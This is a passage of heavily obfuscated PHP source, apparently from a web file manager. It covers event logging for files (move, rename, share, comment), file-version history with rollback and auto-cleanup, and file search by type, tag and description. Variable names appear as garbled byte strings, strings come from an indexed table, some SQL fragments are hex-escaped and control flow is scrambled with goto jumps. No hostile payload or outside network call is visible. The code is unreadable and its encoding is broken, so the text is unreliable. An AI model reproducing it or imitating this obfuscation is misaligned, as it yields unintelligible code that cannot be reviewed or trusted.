$a¼š†·…Îã[2072], $eÛ‹Úö¿); } public function eventRecycle($Fª¸Ø“é²á, $dõ¹â×ˆË÷) { return $this->addEvent($Fª¸Ø“é²á, $_SERVER[¼€¼ˆ¦‚¡][2287], $dõ¹â×ˆË÷); } public function eventRemove($AÀÚƒïˆ¹) { $aãÛé¨ÊÙê =& $_SERVER[¼€¼ˆ¦‚¡]; $bô×Îßåª¬ = Model($aãÛé¨ÊÙê[1117])->sourceInfo($AÀÚƒïˆ¹); $CàÖôˆî‰  = $bô×Îßåª¬[$aãÛé¨ÊÙê[28]]; return $this->addEvent($bô×Îßåª¬[$aãÛé¨ÊÙê[461]], $aãÛé¨ÊÙê[2071], $CàÖôˆî‰ ); } public function eventShare($BÈ¾šç‹Ö‡, $e‘Ô¦çî“) { return $this->addEvent($BÈ¾šç‹Ö‡, $_SERVER[¼€¼ˆ¦‚¡][2082], $e‘Ô¦çî“); } public function eventMove($d™İ¹£ÙÇç, $BÓô†±„ œ, $aŞ¸µ“½…¶) { goto eƒ‘î¢œ¸; DåÎšÉ¡İÈ: $this->addEvent($BÓô†±„ œ, $EÂ‰ØæŒóˆ[2297], $b²ÍŸ»ß‰Ó); goto e”Ê¹Œ„±; eƒ‘î¢œ¸: $EÂ‰ØæŒóˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $Cš’«ˆİóø = Model($EÂ‰ØæŒóˆ[1117]); $Bò·Ú’Ü = $Cš’«ˆİóø->sourceInfo($d™İ¹£ÙÇç); goto e¡¬˜ÇªŞ©; e¡¬˜ÇªŞ©: $F‚Ö¿êŞ­ = $Cš’«ˆİóø->sourceInfo($BÓô†±„ œ); $EùÅÃª…™” = $Cš’«ˆİóø->sourceInfo($aŞ¸µ“½…¶); $b²ÍŸ»ß‰Ó = array($EÂ‰ØæŒóˆ[1006] => $BÓô†±„ œ, $EÂ‰ØæŒóˆ[2293] => $F‚Ö¿êŞ­[$EÂ‰ØæŒóˆ[28]], $EÂ‰ØæŒóˆ[2294] => $F‚Ö¿êŞ­[$EÂ‰ØæŒóˆ[466]], $EÂ‰ØæŒóˆ[1007] => $aŞ¸µ“½…¶, $EÂ‰ØæŒóˆ[2295] => $EùÅÃª…™”[$EÂ‰ØæŒóˆ[28]], $EÂ‰ØæŒóˆ[2296] => $EùÅÃª…™”[$EÂ‰ØæŒóˆ[466]]); goto AË©”ÔÀ˜Ç; AË©”ÔÀ˜Ç: $this->addEvent($d™İ¹£ÙÇç, $EÂ‰ØæŒóˆ[492], $b²ÍŸ»ß‰Ó); $Bò·Ú’Ü = $Cš’«ˆİóø->sourceInfo($d™İ¹£ÙÇç); $b²ÍŸ»ß‰Ó = array($EÂ‰ØæŒóˆ[369] => $Bò·Ú’Ü[$EÂ‰ØæŒóˆ[369]], $EÂ‰ØæŒóˆ[28] => $Bò·Ú’Ü[$EÂ‰ØæŒóˆ[28]]); goto DåÎšÉ¡İÈ; e”Ê¹Œ„±: } public function eventCopy($BÌìå›¢‘) { $this->eventCreate($BÌìå›¢‘, $_SERVER[¼€¼ˆ¦‚¡][490]); } public function eventRename($EåÆÕªöœà, $aòìŸ“á, $c×ßæà‹Ã˜) { $d˜›Ò‡‘Ç =& $_SERVER[¼€¼ˆ¦‚¡]; $FºÔ©™»×Ï = array($d˜›Ò‡‘Ç[1006] => $aòìŸ“á, $d˜›Ò‡‘Ç[1007] => $c×ßæà‹Ã˜); return $this->addEvent($EåÆÕªöœà, $d˜›Ò‡‘Ç[1130], $FºÔ©™»×Ï); } public function eventAddComment($CĞå†ÛˆÜ¹, $CŞ÷ìïš¼) { return $this->addEvent($CĞå†ÛˆÜ¹, $_SERVER[¼€¼ˆ¦‚¡][2298], $CŞ÷ìïš¼); } public function eventAddDesc($E½›ÙÀƒ«, $b¡òÏƒİ×í) { return $this->addEvent($E½›ÙÀƒ«, $_SERVER[¼€¼ˆ¦‚¡][2299], $b¡òÏƒİ×í); } public function listBySource($a³‡®¨­™) { goto cŠ”œ¬øÄ÷; cŠ”œ¬øÄ÷: $dŠ¹º÷‚Â =& $_SERVER[¼€¼ˆ¦‚¡]; $Cµ¹­Ù„İØ = Model($dŠ¹º÷‚Â[1117])->sourceInfo($a³‡®¨­™); $B öŒìå¬ = array($dŠ¹º÷‚Â[383] => $a³‡®¨­™); goto A¥Û¢í¤ñ·; aÛ»Ú¤ÆĞÖ: return $this->eventListParse($A—Ì‰÷ĞŒ, $a³‡®¨­™); goto Cí“§‚ÅĞØ; A¥Û¢í¤ñ·: if ($Cµ¹­Ù„İØ[$dŠ¹º÷‚Â[370]] == $dŠ¹º÷‚Â[83]) { $e”•Ë·„ğ½ = Model($dŠ¹º÷‚Â[1117])->listSearchChildren($a³‡®¨­™, 20000); $e”•Ë·„ğ½[] = $a³‡®¨­™ . $dŠ¹º÷‚Â[361]; $B öŒìå¬ = array($dŠ¹º÷‚Â[369] => array($dŠ¹º÷‚Â[7], $e”•Ë·„ğ½)); } $A—Ì‰÷ĞŒ = $this->where($B öŒìå¬)->order($dŠ¹º÷‚Â[2300])->selectPage(); if ($A—Ì‰÷ĞŒ[$dŠ¹º÷‚Â[351]][$dŠ¹º÷‚Â[352]] == 0) { $A—Ì‰÷ĞŒ[$dŠ¹º÷‚Â[351]][$dŠ¹º÷‚Â[352]] = 1; $A—Ì‰÷ĞŒ[$dŠ¹º÷‚Â[354]] = array(array($dŠ¹º÷‚Â[383] => $a³‡®¨­™, $dŠ¹º÷‚Â[2283] => $Cµ¹­Ù„İØ[$dŠ¹º÷‚Â[461]], $dŠ¹º÷‚Â[1428] => $Cµ¹­Ù„İØ[$dŠ¹º÷‚Â[378]], $dŠ¹º÷‚Â[388] => $dŠ¹º÷‚Â[2301], $dŠ¹º÷‚Â[389] => $Cµ¹­Ù„İØ[$dŠ¹º÷‚Â[187]], $dŠ¹º÷‚Â[1430] => $dŠ¹º÷‚Â[33])); } goto aÛ»Ú¤ÆĞÖ; Cí“§‚ÅĞØ: } private function eventListParse($FæèÏĞºÆÁ, $bñôÜ¸‰) { goto EÌ áÛÃ§…; DëÌ¯ß®é¥: $Aƒ¡ŠÒÛå’ = array_to_keyvalue($eÊğÃÖÛÛ, $eÇãÃß×—“[33], $eÇãÃß×—“[2289]); foreach ($eÊğÃÖÛÛ as $eÁãÂÍ´™’) { $Bª¤Œ÷ÅãË = $eÁãÂÍ´™’[$eÇãÃß×—“[405]]; if ($eÁãÂÍ´™’[$eÇãÃß×—“[29]] == $eÇãÃß×—“[492] && isset($Bª¤Œ÷ÅãË[$eÇãÃß×—“[1006]])) { $F¥ğœŠøï˜[] = $Bª¤Œ÷ÅãË[$eÇãÃß×—“[1006]] . $eÇãÃß×—“[33]; $F¥ğœŠøï˜[] = $Bª¤Œ÷ÅãË[$eÇãÃß×—“[1007]] . $eÇãÃß×—“[33]; } if ($eÁãÂÍ´™’[$eÇãÃß×—“[29]] == $eÇãÃß×—“[2297] && isset($Bª¤Œ÷ÅãË[$eÇãÃß×—“[369]])) { $F¥ğœŠøï˜[] = $Bª¤Œ÷ÅãË[$eÇãÃß×—“[369]] . $eÇãÃß×—“[33]; } } $F¥ğœŠøï˜ = array_merge($F¥ğœŠøï˜, $Aƒ¡ŠÒÛå’, array($bñôÜ¸‰ . $eÇãÃß×—“[33])); goto f ¡Ú–“; EÌ áÛÃ§…: $eÇãÃß×—“ =& $_SERVER[¼€¼ˆ¦‚¡]; $eÊğÃÖÛÛ = $FæèÏĞºÆÁ[$eÇãÃß×—“[354]]; $F¥ğœŠøï˜ = array_to_keyvalue($eÊğÃÖÛÛ, $eÇãÃß×—“[33], $eÇãÃß×—“[369]); goto DëÌ¯ß®é¥; aë»’¨Ö®: return $FæèÏĞºÆÁ; goto e¦Ü›Õñ™¶; Dô¬øÜ„Û“: $aŸˆ†éÊÉ = Model($eÇãÃß×—“[749])->sourceListInfo($F¥ğœŠøï˜, !0); foreach ($eÊğÃÖÛÛ as &$eÁãÂÍ´™’) { if ($eÁãÂÍ´™’[$eÇãÃß×—“[29]] == $eÇãÃß×—“[492] && isset($eÁãÂÍ´™’[$eÇãÃß×—“[405]][$eÇãÃß×—“[1006]])) { $eÁãÂÍ´™’[$eÇãÃß×—“[405]][$eÇãÃß×—“[1006]] = $aŸˆ†éÊÉ[$eÁãÂÍ´™’[$eÇãÃß×—“[405]][$eÇãÃß×—“[1006]]]; $eÁãÂÍ´™’[$eÇãÃß×—“[405]][$eÇãÃß×—“[1007]] = $aŸˆ†éÊÉ[$eÁãÂÍ´™’[$eÇãÃß×—“[405]][$eÇãÃß×—“[1007]]]; } if ($eÁãÂÍ´™’[$eÇãÃß×—“[29]] == $eÇãÃß×—“[2297] && isset($eÁãÂÍ´™’[$eÇãÃß×—“[405]][$eÇãÃß×—“[369]])) { $eÁãÂÍ´™’[$eÇãÃß×—“[405]][$eÇãÃß×—“[369]] = $aŸˆ†éÊÉ[$eÁãÂÍ´™’[$eÇãÃß×—“[405]][$eÇãÃß×—“[369]]]; } $eÁãÂÍ´™’[$eÇãÃß×—“[391]] = $aŸˆ†éÊÉ[$eÁãÂÍ´™’[$eÇãÃß×—“[369]]]; $eÁãÂÍ´™’[$eÇãÃß×—“[2302]] = $aŸˆ†éÊÉ[$eÁãÂÍ´™’[$eÇãÃß×—“[2289]]]; if ($eÁãÂÍ´™’[$eÇãÃß×—“[29]] == $eÇãÃß×—“[2071]) { $eÁãÂÍ´™’[$eÇãÃß×—“[2302]] = $eÁãÂÍ´™’[$eÇãÃß×—“[391]]; $eÁãÂÍ´™’[$eÇãÃß×—“[2289]] = $eÁãÂÍ´™’[$eÇãÃß×—“[2302]][$eÇãÃß×—“[369]]; $eÁãÂÍ´™’[$eÇãÃß×—“[391]] = !1; $eÁãÂÍ´™’[$eÇãÃß×—“[369]] = $eÇãÃß×—“[33]; } $eÁãÂÍ´™’[$eÇãÃß×—“[2245]] = $d•¨Ë‰ãÒ…[$eÁãÂÍ´™’[$eÇãÃß×—“[1437]]]; } $FæèÏĞºÆÁ[$eÇãÃß×—“[354]] = $eÊğÃÖÛÛ; goto aë»’¨Ö®; f ¡Ú–“: $F¥ğœŠøï˜ = array_unique($F¥ğœŠøï˜); $Cï¼²·„Õ† = array_unique(array_to_keyvalue($eÊğÃÖÛÛ, $eÇãÃß×—“[33], $eÇãÃß×—“[1437])); $d•¨Ë‰ãÒ… = Model($eÇãÃß×—“[477])->userListInfo($Cï¼²·„Õ†); goto Dô¬øÜ„Û“; e¦Ü›Õñ™¶: } public function removeBySource($b«âù³å¦) { $Añë›²Ş’© = array($_SERVER[¼€¼ˆ¦‚¡][383] => $b«âù³å¦); $this->where($Añë›²Ş’©)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\x72\x63\145\x5f\150\151\163\164\x6f\162\171"; public function addHistory($B°èÎÔÀ„Ç, $cÙÚÈÆ’Îì = '') { $b¥šš¥À“‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $b‚¡‹Üî÷ = array($b¥šš¥À“‚[383] => $B°èÎÔÀ„Ç[$b¥šš¥À“‚[369]], $b¥šš¥À“‚[1428] => isset($B°èÎÔÀ„Ç[$b¥šš¥À“‚[379]]) ? $B°èÎÔÀ„Ç[$b¥šš¥À“‚[379]] : $B°èÎÔÀ„Ç[$b¥šš¥À“‚[378]], $b¥šš¥À“‚[420] => $B°èÎÔÀ„Ç[$b¥šš¥À“‚[419]], $b¥šš¥À“‚[520] => $B°èÎÔÀ„Ç[$b¥šš¥À“‚[77]], $b¥šš¥À“‚[2303] => $cÙÚÈÆ’Îì); $DÄÜÍÛŠÒà = $GLOBALS[$b¥šš¥À“‚[6]][$b¥šš¥À“‚[84]][$b¥šš¥À“‚[2304]]; if ($DÄÜÍÛŠÒà > 1) { $this->historyAutoClear($b‚¡‹Üî÷[$b¥šš¥À“‚[369]]); $this->add($b‚¡‹Üî÷); } Model($b¥šš¥À“‚[2305])->eventFileEdit($B°èÎÔÀ„Ç[$b¥šš¥À“‚[369]]); } private function historyAutoClear($Bå—«…Œí•) { goto d¤”£¼ºÈ; Fİ§¶òÅø: if ($c£îŒ…‡ß† >= 500) { return; } $Aç„œºˆŠ = array($cÛİº‚ÖÑ»[383] => $Bå—«…Œí•); $C¢İÇğÅ¾ = $this->field($cÛİº‚ÖÑ»[2308])->where($Aç„œºˆŠ)->order($cÛİº‚ÖÑ»[2300])->select(); goto cˆƒÈĞ×÷Ç; d¤”£¼ºÈ: $cÛİº‚ÖÑ» =& $_SERVER[¼€¼ˆ¦‚¡]; $bº’‚ˆå‘ = Model($cÛİº‚ÖÑ»[1088])->get($cÛİº‚ÖÑ»[2306]); $cœ°‹Å±öë = $GLOBALS[$cÛİº‚ÖÑ»[6]][$cÛİº‚ÖÑ»[84]][$cÛİº‚ÖÑ»[2304]]; goto dªÒİÒÇø; dªÒİÒÇø: $f†£ôâÌ = $bº’‚ˆå‘ == $cÛİº‚ÖÑ»[2307] ? 3 : $cœ°‹Å±öë; if ($cœ°‹Å±öë <= 1) { $f†£ôâÌ = 1; } $c£îŒ…‡ß† = $f†£ôâÌ - 1; goto Fİ§¶òÅø; D ÄÓ»Ûª“: $Aç„œºˆŠ = array($cÛİº‚ÖÑ»[385] => array($cÛİº‚ÖÑ»[7], $CÊñ™å‡™Ë)); $this->where($Aç„œºˆŠ)->delete(); Model($cÛİº‚ÖÑ»[422])->remove($F‡Ÿ¨‰Ûº£); goto Bººòë¿÷; cˆƒÈĞ×÷Ç: if (!$C¢İÇğÅ¾ || $c£îŒ…‡ß† >= count($C¢İÇğÅ¾)) { return; } $CÊñ™å‡™Ë = array_to_keyvalue($C¢İÇğÅ¾, $cÛİº‚ÖÑ»[33], $cÛİº‚ÖÑ»[367]); $CÊñ™å‡™Ë = array_slice($CÊñ™å‡™Ë, $c£îŒ…‡ß†); goto B¼ ó©ˆ’À; B¼ ó©ˆ’À: $F‡Ÿ¨‰Ûº£ = array_to_keyvalue($C¢İÇğÅ¾, $cÛİº‚ÖÑ»[33], $cÛİº‚ÖÑ»[419]); $F‡Ÿ¨‰Ûº£ = array_slice($F‡Ÿ¨‰Ûº£, $c£îŒ…‡ß†); if (!$CÊñ™å‡™Ë || !$F‡Ÿ¨‰Ûº£) { return; } goto D ÄÓ»Ûª“; Bººòë¿÷: } public function listData($E­Œ‡‰”Ãó) { goto aÎ‹Ú¾ ¿; C‘¬¢Ü˜‹: $eø’¶ˆ”Ä = $this->field($b¼ÀÄ´Èà)->where($fÙÀ†¼¬¬)->order($b§äì¤óÌ±[2300])->selectPage(); $this->_listAppendUser($eø’¶ˆ”Ä[$b§äì¤óÌ±[354]]); $däòÈÆ††ã = Model($b§äì¤óÌ±[1088])->get($b§äì¤óÌ±[2306]); goto F—œî¬ÉÈ; F—œî¬ÉÈ: $fçæ××£† = 3; if ($däòÈÆ††ã == $b§äì¤óÌ±[2307]) { $eø’¶ˆ”Ä[$b§äì¤óÌ±[354]] = array_slice($eø’¶ˆ”Ä[$b§äì¤óÌ±[354]], 0, $fçæ××£†); $eø’¶ˆ”Ä[$b§äì¤óÌ±[351]] = array($b§äì¤óÌ±[2310] => 1, $b§äì¤óÌ±[2311] => 20, $b§äì¤óÌ±[2312] => 1, $b§äì¤óÌ±[2313] => count($eø’¶ˆ”Ä[$b§äì¤óÌ±[354]])); } return $eø’¶ˆ”Ä; goto A„¨Ğë“Ôø; aÎ‹Ú¾ ¿: $b§äì¤óÌ± =& $_SERVER[¼€¼ˆ¦‚¡]; $fÙÀ†¼¬¬ = array($b§äì¤óÌ±[383] => $E­Œ‡‰”Ãó); $b¼ÀÄ´Èà = $b§äì¤óÌ±[2309]; goto C‘¬¢Ü˜‹; A„¨Ğë“Ôø: } protected function _listAppendUser(&$A¢†öÖ£‰¦) { $FÔ×ï§ =& $_SERVER[¼€¼ˆ¦‚¡]; $dÙ¿³õ†Î = array_to_keyvalue($A¢†öÖ£‰¦, $FÔ×ï§[33], $FÔ×ï§[1437]); $EËÛéŒ­®‹ = Model($FÔ×ï§[477])->userListInfo($dÙ¿³õ†Î); foreach ($A¢†öÖ£‰¦ as &$BÒ¬òš‡æ) { $Eñ™ò³†Ú = $BÒ¬òš‡æ[$FÔ×ï§[1437]]; $BÒ¬òš‡æ[$FÔ×ï§[378]] = $EËÛéŒ­®‹[$Eñ™ò³†Ú] ? $EËÛéŒ­®‹[$Eñ™ò³†Ú] : !1; } } public function fileInfo($aÓó¾ôŠ˜Ì) { $bµ«µ¿İ¿ =& $_SERVER[¼€¼ˆ¦‚¡]; $d›¢‚›’›ö = $this->tablePrefix; $fëŸ•²ÒÈÅ = "{$d›¢‚›’›ö}\151\x6f\137\x66\151\x6c\x65\x20\146\x69\154\145\163\x20\157\x6e\40\x66\x69\x6c\x65\163\56\146\x69\154\145\x49\104\x20\75\x20\x68\151\x73\164\157\162\x79\56\x66\x69\154\145\x49\x44"; return $this->alias($bµ«µ¿İ¿[2314])->where(array($bµ«µ¿İ¿[385] => $aÓó¾ôŠ˜Ì))->join($fëŸ•²ÒÈÅ, $bµ«µ¿İ¿[2315])->find(); } public function removeItem($c¦¼‡‰ÍŠ) { $d¹²ŸÒœµÂ =& $_SERVER[¼€¼ˆ¦‚¡]; $f•ÓÒŸÙ¹ = array($d¹²ŸÒœµÂ[385] => $c¦¼‡‰ÍŠ); $aˆÖÖ‹æ§ = $this->where($f•ÓÒŸÙ¹)->find(); if ($aˆÖÖ‹æ§) { $d„ôó¯´” = $this->where($f•ÓÒŸÙ¹)->delete(); Model($d¹²ŸÒœµÂ[422])->remove($aˆÖÖ‹æ§[$d¹²ŸÒœµÂ[419]]); return $d„ôó¯´”; } return !1; } public function removeBySource($AâÙ¥ÂÎÓ) { goto aïö¯÷‹¨; eóÓ®ƒ¨©ñ: $f¨ïÊ®Äø‰ = array($f»‡ëöîğï[383] => array($f»‡ëöîğï[7], $AâÙ¥ÂÎÓ)); $BæéªµèÉ = $this->field($f»‡ëöîğï[420])->where($f¨ïÊ®Äø‰)->select(); if ($BæéªµèÉ) { $this->where($f¨ïÊ®Äø‰)->delete(); $cô¢‡¶ìÚ½ = array_to_keyvalue($BæéªµèÉ, $f»‡ëöîğï[33], $f»‡ëöîğï[419]); Model($f»‡ëöîğï[422])->remove($cô¢‡¶ìÚ½); } goto F”ËÊÊ˜; F”ËÊÊ˜: return !0; goto C‹ïÌ±Çæ; aïö¯÷‹¨: $f»‡ëöîğï =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$AâÙ¥ÂÎÓ) { return !1; } if (!is_array($AâÙ¥ÂÎÓ)) { $AâÙ¥ÂÎÓ = array($AâÙ¥ÂÎÓ); } goto eóÓ®ƒ¨©ñ; C‹ïÌ±Çæ: } public function setDetail($CŸÚßÓÅœ¯, $f­Ñøë±“²) { $B¿‹¼ƒØ“¿ =& $_SERVER[¼€¼ˆ¦‚¡]; return $this->where(array($B¿‹¼ƒØ“¿[385] => $CŸÚßÓÅœ¯))->save(array($B¿‹¼ƒØ“¿[2303] => $f­Ñøë±“²)); } public function rollbackToItem($CÃÑ†å®Œ™, $f£´¥š¼¶—) { goto d±†«­ÓŠİ; d©œ£‹µÚÅ: $F»çÓæã®· = $this->find($f£´¥š¼¶—); $F ºÉ‚ŞÃ = array($EáÇî•ë§½[419] => $F»çÓæã®·[$EáÇî•ë§½[419]], $EáÇî•ë§½[77] => $F»çÓæã®·[$EáÇî•ë§½[77]], $EáÇî•ë§½[107] => time(), $EáÇî•ë§½[379] => USER_ID); Model($EáÇî•ë§½[749])->where(array($EáÇî•ë§½[369] => $CÃÑ†å®Œ™))->save($F ºÉ‚ŞÃ); goto a®¿¥–é; d±†«­ÓŠİ: $EáÇî•ë§½ =& $_SERVER[¼€¼ˆ¦‚¡]; $B‚„Ô¥‘ÃÌ = Model($EáÇî•ë§½[749])->sourceInfo($CÃÑ†å®Œ™); $this->addHistory($B‚„Ô¥‘ÃÌ); goto d©œ£‹µÚÅ; a®¿¥–é: return $this->where(array($EáÇî•ë§½[385] => $f£´¥š¼¶—))->delete(); goto dÍÇòæ’íº; dÍÇòæ’íº: } public function clearSame($E‚™ˆ­ÇÊ) { goto Dˆªå«°Ê˜; BëšÉ¹±Û: $C­ã“ÉÜˆâ = array(); $F¸¹º³Õ¸È = array(); foreach ($bÅ¤æ¨ğ as $Bï¢œ½Ã°) { if (!$Bï¢œ½Ã° || count($Bï¢œ½Ã°) <= 1) { continue; } foreach ($Bï¢œ½Ã° as $C«¤¨´®·Æ) { $C­ã“ÉÜˆâ[] = $C«¤¨´®·Æ[$Dš¾Éƒ©ò[419]]; $F¸¹º³Õ¸È[] = $C«¤¨´®·Æ[$Dš¾Éƒ©ò[367]]; } } goto D••„Ùçï°; Dˆªå«°Ê˜: $Dš¾Éƒ©ò =& $_SERVER[¼€¼ˆ¦‚¡]; $d¨‚ê“ß = $this->listData($E‚™ˆ­ÇÊ); $bÅ¤æ¨ğ = array_to_keyvalue_group($d¨‚ê“ß, $Dš¾Éƒ©ò[419]); goto BëšÉ¹±Û; D••„Ùçï°: if (!$F¸¹º³Õ¸È) { return; } $this->where(array($Dš¾Éƒ©ò[367] => array($Dš¾Éƒ©ò[7], $F¸¹º³Õ¸È)))->delete(); Model($Dš¾Éƒ©ò[422])->remove($C­ã“ÉÜˆâ); goto DË·é‘…‡¶; DË·é‘…‡¶: } public function userSpace() { $côùì¨“¸¸ =& $_SERVER[¼€¼ˆ¦‚¡]; $cİÁÕ›­÷ = $this->tablePrefix; $bÏó¿º”°— = array($côùì¨“¸¸[1428] => USER_ID); $F±Ù™ÆÎ±… = "{$cİÁÕ›­÷}\151\x6f\137\146\151\x6c\145\40\x66\x69\x6c\145\x73\x20\157\x6e\40\146\x69\154\145\163\x2e\x66\x69\x6c\145\x49\104\40\75\40\150\x69\163\x74\x6f\x72\171\56\146\151\154\145\x49\x44"; return $this->alias($côùì¨“¸¸[2314])->where($bÏó¿º”°—)->join($F±Ù™ÆÎ±…, $côùì¨“¸¸[2315])->sum($côùì¨“¸¸[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($eæ´Œ¸ì‘) { goto CµŒ®ã‘½ß; Eóğ­‰Š¾ë: if (!$c¨“Ÿ„£«[$Aç ²æ„‰[160]]) { $BŠÑæ¼‘Ü¬ = array_to_keyvalue($aÏººËÖ, $Aç ²æ„‰[33], $Aç ²æ„‰[160]); $bÎæÑ›­Æ  = implode($Aç ²æ„‰[47], $BŠÑæ¼‘Ü¬); $Aê§Ÿ•†Ğæ = $Aç ²æ„‰[2266]; } $aöƒò»Êõ = explode($Aç ²æ„‰[47], trim($bÎæÑ›­Æ , $Aç ²æ„‰[47])); return array($Aê§Ÿ•†Ğæ, $aöƒò»Êõ); goto cİô¬ôíÚğ; CµŒ®ã‘½ß: $Aç ²æ„‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $aÏººËÖ = KodIO::fileTypeList(); $c¨“Ÿ„£« = $aÏººËÖ[$eæ´Œ¸ì‘]; goto bíÀôâãíğ; bíÀôâãíğ: if (!$c¨“Ÿ„£«) { return array(); } $bÎæÑ›­Æ  = $c¨“Ÿ„£«[$Aç ²æ„‰[160]]; $Aê§Ÿ•†Ğæ = $Aç ²æ„‰[7]; goto Eóğ­‰Š¾ë; cİô¬ôíÚğ: } public function listPathType($e»•àĞµ‘÷) { $e‰Ê¥†Œ£ =& $_SERVER[¼€¼ˆ¦‚¡]; $FŠà©ŒÄÆÔ = $this->fileTypeWhere($e»•àĞµ‘÷); if (!$FŠà©ŒÄÆÔ) { return array(); } $bø£×ÑĞ´× = array($e‰Ê¥†Œ£[521] => SourceModel::TYPE_USER, $e‰Ê¥†Œ£[522] => USER_ID, $e‰Ê¥†Œ£[518] => 0, $e‰Ê¥†Œ£[519] => $FŠà©ŒÄÆÔ); return $this->listSource($bø£×ÑĞ´×); } public function listSearch($Bã—½Ğ´Àˆ, $D™Ïˆò„¥µ = 300) { goto d®“’‰ˆØš; däê›©“ÆŞ: if (!isset($e¥ÂÄğ¼ï¸[$aÑé¿ÛŠÃ[397]])) { $e¥ÂÄğ¼ï¸[$aÑé¿ÛŠÃ[397]] = 0; } $EÌ¨Ò –¦â = $aÑé¿ÛŠÃ[2317]; $eß²Î²„¶† = $EÌ¨Ò –¦â; goto bÜ†‡‘àÃ¥; f†ìÂô¶ù·: $this->_listMake($c ×ÅòÆÃº); return $c ×ÅòÆÃº; goto EÎà¼õÕ§é; d®“’‰ˆØš: $aÑé¿ÛŠÃ =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset($Bã—½Ğ´Àˆ[$aÑé¿ÛŠÃ[2183]]) && $Bã—½Ğ´Àˆ[$aÑé¿ÛŠÃ[2183]]) { $Bã—½Ğ´Àˆ[$aÑé¿ÛŠÃ[2183]] = str_replace($aÑé¿ÛŠÃ[1593], $aÑé¿ÛŠÃ[2316], trim($Bã—½Ğ´Àˆ[$aÑé¿ÛŠÃ[2183]])); } $e¥ÂÄğ¼ï¸ = $this->_parseSearchWhere($Bã—½Ğ´Àˆ); goto däê›©“ÆŞ; DÙÆ›íªô: $this->_listSearchDesc($c ×ÅòÆÃº, $Bã—½Ğ´Àˆ, $eß²Î²„¶†); $this->_listSearchTag($c ×ÅòÆÃº, $Bã—½Ğ´Àˆ, $eß²Î²„¶†); $this->_listDataApply($c ×ÅòÆÃº[$aÑé¿ÛŠÃ[354]]); goto f†ìÂô¶ù·; bÜ†‡‘àÃ¥: $this->_listSearchBindPinyin($Bã—½Ğ´Àˆ, $e¥ÂÄğ¼ï¸, $EÌ¨Ò –¦â); $this->alias($aÑé¿ÛŠÃ[487])->_makeOrder()->cache(null, 10); $c ×ÅòÆÃº = $this->distinct(!0)->field($EÌ¨Ò –¦â)->where($e¥ÂÄğ¼ï¸)->selectPage($D™Ïˆò„¥µ); goto DÙÆ›íªô; EÎà¼õÕ§é: } private function _listSearchTag(&$f“íß®ƒ„, $AÛÇ‰‘¿´±, $d—íµéÈ¼¦) { goto e‹–İé×î–; bëÔÑ¼«¥Š: $bÌ² †Äºè = array_to_keyvalue($bÌ² †Äºè, $cÇ¿è˜¼Ş[33], $cÇ¿è˜¼Ş[75]); $fÍôóãÂÛä = array_unique($bÌ² †Äºè); $this->_listSearchMerge($f“íß®ƒ„, $AÛÇ‰‘¿´±, $d—íµéÈ¼¦, $fÍôóãÂÛä); goto aÔµ‹ˆ‰£İ; e‹–İé×î–: $cÇ¿è˜¼Ş =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$AÛÇ‰‘¿´±[$cÇ¿è˜¼Ş[2183]] || $f“íß®ƒ„[$cÇ¿è˜¼Ş[351]][$cÇ¿è˜¼Ş[340]] > 1) { return; } $bí÷ë‚Çì• = Model($cÇ¿è˜¼Ş[2318])->listData(); goto b‚Ú¹âŒ¦; b‚Ú¹âŒ¦: $FÛÌ ¯ÁØ = array(); $C•°°Æ™² = $AÛÇ‰‘¿´±[$cÇ¿è˜¼Ş[2183]]; foreach ($bí÷ë‚Çì• as $FÄ¨ñÛç) { $e†‚ïŞÜ   = $FÄ¨ñÛç[$cÇ¿è˜¼Ş[28]]; $F¿Ÿ¢‹¹­ = str_replace($cÇ¿è˜¼Ş[50], $cÇ¿è˜¼Ş[33], Pinyin::encode($e†‚ïŞÜ  )); if (stripos($e†‚ïŞÜ  , $C•°°Æ™²) !== !1 || stripos($F¿Ÿ¢‹¹­, $C•°°Æ™²) !== !1) { $FÛÌ ¯ÁØ[] = $FÄ¨ñÛç[$cÇ¿è˜¼Ş[367]]; } } goto Eöƒ™Õ±; Eöƒ™Õ±: if (!$FÛÌ ¯ÁØ) { return; } $C†á¯—¾¯„ = array($cÇ¿è˜¼Ş[393] => array($cÇ¿è˜¼Ş[7], $FÛÌ ¯ÁØ)); $bÌ² †Äºè = Model($cÇ¿è˜¼Ş[394])->field($cÇ¿è˜¼Ş[75])->where($C†á¯—¾¯„)->select(); goto bëÔÑ¼«¥Š; aÔµ‹ˆ‰£İ: } private function _listSearchDesc(&$AöŠôÚÙÔ, $E¶©Ù¹Ó, $EãƒåİäÒ¾) { goto bºˆÎ»Ëë; bºˆÎ»Ëë: $Dåï¯ÌÄ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$E¶©Ù¹Ó[$Dåï¯ÌÄ[2183]] || $AöŠôÚÙÔ[$Dåï¯ÌÄ[351]][$Dåï¯ÌÄ[340]] > 1) { return; } $aÙ´ÚŠªËÉ = $this->listSearchChildren($E¶©Ù¹Ó[$Dåï¯ÌÄ[461]]); goto fÏîğÈ¬µ‚; C²Œ»×®”“: $e˜¼´¾´§â = Model($Dåï¯ÌÄ[504])->field($Dåï¯ÌÄ[369])->where($AŒƒèğ’­•)->select(); $B¾Òâ‹ÎË = array_to_keyvalue($e˜¼´¾´§â, $Dåï¯ÌÄ[33], $Dåï¯ÌÄ[369]); $this->_listSearchMerge($AöŠôÚÙÔ, $E¶©Ù¹Ó, $EãƒåİäÒ¾, $B¾Òâ‹ÎË); goto E†„˜Üœ±; fÏîğÈ¬µ‚: $aÙ´ÚŠªËÉ = array_unique($aÙ´ÚŠªËÉ); if (!$aÙ´ÚŠªËÉ) { return; } $AŒƒèğ’­• = array($Dåï¯ÌÄ[369] => array($Dåï¯ÌÄ[7], $aÙ´ÚŠªËÉ), $Dåï¯ÌÄ[89] => $Dåï¯ÌÄ[405], $Dåï¯ÌÄ[359] => array($Dåï¯ÌÄ[748], $Dåï¯ÌÄ[2185] . $E¶©Ù¹Ó[$Dåï¯ÌÄ[2183]] . $Dåï¯ÌÄ[2185])); goto C²Œ»×®”“; E†„˜Üœ±: } private function _listSearchMerge(&$eĞŸº×›¸Ä, $b™‘ìØ‚ÍË, 